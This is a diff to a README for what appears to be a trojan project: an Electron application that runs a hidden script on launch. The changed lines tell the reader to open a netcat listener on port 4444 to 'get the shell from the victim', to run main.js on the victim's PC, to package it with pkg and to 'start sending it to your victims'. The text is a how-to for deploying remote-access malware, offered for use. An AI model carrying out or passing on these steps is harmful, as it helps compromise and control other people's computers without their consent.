@@ -34,4 +34,4 @@ When you start the executable a script will be executed at the same moment the "
 - Start Tailwind from the folder with the command `npx tailwindcss -i ./src/input.css -o ./src/output.css --watch` to get the electron website working properly
 
 - First, on the pc you want to get the shell from the victim, just start ncat with the command : `nc -l 4444`, 
-start the main.js file with the command : 'node main.js' on the victims PC . If everything is working up, you can build the main.js file with the command : `` and then start sending it to your victims.
+start the main.js file with the command : 'node main.js' on the victims PC . If everything is working up, you can build the main.js file with the command : `pkg main.js` and then start sending it to your victims.
